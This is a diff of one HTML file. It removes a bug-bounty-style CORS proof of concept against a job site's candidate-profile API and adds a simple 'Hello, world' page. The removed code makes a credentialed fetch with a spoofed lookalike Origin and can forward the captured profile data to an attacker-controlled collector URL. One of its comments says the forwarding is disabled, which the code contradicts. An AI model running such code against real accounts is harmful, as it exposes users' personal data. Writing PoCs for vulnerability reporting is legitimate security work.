@@ -2,126 +2,26 @@
 <html lang="en">
 <head>
   <meta charset="utf-8" />
-  <meta name="viewport" content="width=device-width,initial-scale=1" />
-  <title>StepStone CORS PoC</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>Hello — Drakon</title>
   <style>
-    body{font-family:system-ui,Segoe UI,Roboto,Arial;margin:16px;background:#f7fafc;color:#0f172a}
-    pre{background:#fff;border:1px solid #e2e8f0;padding:12px;border-radius:8px;overflow:auto;max-height:45vh}
-    .card{background:#fff;padding:12px;border-radius:8px;box-shadow:0 4px 10px rgba(2,6,23,0.04);margin-bottom:12px}
-    label{display:block;margin:6px 0;font-weight:600}
-    input[type=text]{width:100%;padding:8px;border-radius:6px;border:1px solid #cbd5e1}
-    button{padding:8px 12px;border-radius:6px;border:none;background:#0ea5a4;color:white;cursor:pointer}
-    button.secondary{background:#334155}
-    .muted{color:#64748b;font-size:0.9rem}
+    :root{ --bg:#0f172a; --card:#12263b; --accent:#60a5fa; --text:#e6eef8 }
+    html,body{height:100%;margin:0;font-family:Inter,ui-sans-serif,system-ui,Segoe UI,Roboto,"Helvetica Neue",Arial}
+    body{display:grid;place-items:center;background:linear-gradient(180deg,#071327 0%, #071b2a 100%);color:var(--text)}
+    .card{background:linear-gradient(180deg, rgba(255,255,255,0.03), rgba(255,255,255,0.02));padding:32px;border-radius:16px;box-shadow:0 8px 30px rgba(2,6,23,0.6);max-width:560px;width:90%;text-align:center}
+    h1{margin:0 0 8px;font-size:clamp(1.5rem,3vw,2.25rem);letter-spacing:-0.02em}
+    p{margin:0 0 18px;color:rgba(230,238,248,0.85)}
+    .btn{display:inline-block;padding:10px 16px;border-radius:10px;background:linear-gradient(90deg,var(--accent),#3b82f6);color:#04203b;text-decoration:none;font-weight:600;box-shadow:0 6px 18px rgba(59,130,246,0.18)}
+    footer{margin-top:14px;font-size:0.85rem;color:rgba(230,238,248,0.6)}
   </style>
 </head>
 <body>
-  <h1>StepStone CORS PoC (single-file)</h1>
-  <div class="card">
-    <div class="muted">IMPORTANT: Use only with accounts you control. Do not test on other users or accounts without permission. This PoC is for triage and validation of an issue you reported.</div>
-  </div>
-
-  <div class="card">
-    <label>Target endpoint</label>
-    <input id="target" value="https://www.stepstone.de/candidate/profile/editor/api/v1/profile">
-
-    <label>PoC origin (what to send as Origin header)</label>
-    <input id="pocOrigin" value="https://www.stepstone.de.i-am-hunter.xyz">
-
-    <label>Optional: collector URL (your attacker-controlled logging server). Leave blank to skip forwarding.</label>
-    <input id="collector" placeholder="https://collector.xyz/receive">
-
-    <div style="margin-top:10px">
-      <button id="run">Run PoC (fetch with credentials)</button>
-      <button id="clear" class="secondary">Clear output</button>
-      <button id="save" class="secondary">Save logs</button>
-    </div>
-  </div>
-
-  <div class="card">
-    <label>Result / Console</label>
-    <pre id="out">Ready. Click "Run PoC" to execute the cross-origin fetch from this origin.</pre>
-  </div>
-
-  <script>
-    // Configuration and helpers
-    const out = document.getElementById('out');
-    const targetEl = document.getElementById('target');
-    const originEl = document.getElementById('pocOrigin');
-    const collectorEl = document.getElementById('collector');
-
-    function log(...args){
-      const t = new Date().toISOString();
-      const line = `[${t}] ` + args.map(a => (typeof a === 'string'? a : JSON.stringify(a, null, 2))).join(' ');
-      out.textContent = line + "\n" + out.textContent;
-      return line;
-    }
-
-    async function runPoC(){
-      const target = targetEl.value.trim();
-      const fakeOrigin = originEl.value.trim();
-      if(!target){ alert('Specify target endpoint'); return; }
-
-      log('Starting PoC — target=' + target + ' origin=' + fakeOrigin);
-
-      try{
-        const resp = await fetch(target, {
-          method: 'GET',
-          credentials: 'include',
-          headers: {
-            // NOTE: browsers will block programmatic setting of some forbidden headers in many contexts.
-            // This header value is helpful for testing when replaying requests via Burp or custom clients,
-            // but a real browser may ignore a programmatic Origin override. Keep the field so reviewers
-            // understand intent; for reliable results use a controlled page hosted at the PoC origin or
-            // test with a manual proxy that rewrites headers.
-            'Origin': fakeOrigin
-          }
-        });
-
-        log('HTTP status: ' + resp.status + ' ' + resp.statusText);
-        const aca = resp.headers.get('Access-Control-Allow-Origin');
-        const acc = resp.headers.get('Access-Control-Allow-Credentials');
-        log('Access-Control-Allow-Origin: ' + aca);
-        log('Access-Control-Allow-Credentials: ' + acc);
-
-        const text = await resp.text();
-        let body;
-        try{ body = JSON.parse(text); }
-        catch(e){ body = text; }
-
-        log('Response body (trimmed to 10k chars):');
-        const display = (typeof body === 'string') ? body.slice(0,10000) : JSON.stringify(body, null, 2).slice(0,10000);
-        log(display);
-
-        // Optional: forward to your collector server if you provided one. This is commented out by default
-        // to avoid accidental exfiltration. Uncomment and set collector URL only when using a test account.
-        const collector = collectorEl.value.trim();
-        if(collector){
-          try{
-            // WARNING: only use with your own test account and your own collector domain.
-            await fetch(collector, {method:'POST', headers:{'Content-Type':'application/json'}, body: JSON.stringify({ts:new Date().toISOString(), origin: fakeOrigin, target, status: resp.status, headers: {aca, acc}, body})});
-            log('Forwarded captured data to collector: ' + collector);
-          }catch(e){ log('Failed to forward to collector: ' + e); }
-        }
-
-      }catch(err){
-        log('Fetch error: ' + err);
-      }
-    }
-
-    document.getElementById('run').addEventListener('click', runPoC);
-    document.getElementById('clear').addEventListener('click', ()=> out.textContent='');
-    document.getElementById('save').addEventListener('click', ()=>{
-      const blob = new Blob([out.textContent], {type:'text/plain'});
-      const a = document.createElement('a');
-      a.href = URL.createObjectURL(blob);
-      a.download = 'poc_logs_' + (new Date().toISOString().replace(/[:.]/g,'-')) + '.txt';
-      a.click();
-      URL.revokeObjectURL(a.href);
-    });
-
-    // Auto-run is intentionally disabled. Uncomment to auto-run on page load (only for testing).
-    // window.addEventListener('load', runPoC);
-  </script>
+  <main class="card">
+    <h1>Hello, world 👋</h1>
+    <p>This is a minimal, friendly HTML starter file you can open in any browser. Edit the message below to personalize it.</p>
+    <button class="btn" onclick="document.getElementById('msg').textContent = 'You clicked the button — nice!'">Click me</button>
+    <p id="msg" style="margin-top:16px;color:var(--text)">Have a great day, Drakon.</p>
+    <footer>Generated for you — save as <code>hello.html</code> and open in a browser.</footer>
+  </main>
 </body>
 </html>
